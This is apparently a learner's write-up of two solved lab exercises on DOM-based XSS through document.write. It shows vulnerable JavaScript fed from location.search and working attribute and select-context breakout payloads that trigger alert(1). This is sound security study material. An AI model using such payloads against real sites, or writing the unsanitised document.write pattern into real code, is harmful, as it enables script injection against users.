# DOM XSS — document.write Sink

## The Sink

`document.write()` writes a string directly into the HTML document. If attacker-controlled data reaches it, any HTML (including `<script>` tags) will be rendered and executed.

```javascript
document.write("<tag>" + userInput + "</tag>");
//                        ↑
//              if this comes from location.search → vulnerable
```

---

## Lab 1: DOM XSS in document.write using location.search

**Level:** Apprentice ✅ Solved

**Vulnerable code:**
```javascript
document.write('<img src="/resources/images/tracker.gif?searchTerms=' + 
    location.search + '">');
```

**What happens normally:**
```
URL: ?search=shoes
→ <img src="/resources/images/tracker.gif?searchTerms=shoes">
```

**The attack — break out of the attribute:**
```
Payload: "><svg onload=alert(1)>
```

**Result:**
```html
<img src="/resources/images/tracker.gif?searchTerms=">
<svg onload=alert(1)>">
```

The `"` closes the `src` attribute, `>` closes the `<img>` tag, then the `<svg>` tag with `onload` executes.

---

## Lab 2: DOM XSS in document.write inside a select element

**Level:** Practitioner ✅ Solved

**Vulnerable code:**
```javascript
var stores = ["London", "Paris", "Milan"];
var store = (new URLSearchParams(location.search)).get('storeId');
document.write('<select name="storeId">');
if (store) {
    document.write('<option selected>' + store + '</option>');
}
```

**The attack — inject outside the select context:**
```
?storeId="></select><img src=1 onerror=alert(1)>
```

**Result:**
```html
<select name="storeId">
<option selected>"></select>
<img src=1 onerror=alert(1)>
```

Closing the `</select>` escapes the context, then the `<img>` executes.

---

## Key Takeaways

- `document.write` is dangerous because it renders raw HTML
- Always check what **surrounds** your injection point — you may need to break out of an attribute or tag first
- The payload changes depending on the context (inside `src=""`, inside `<select>`, etc.)
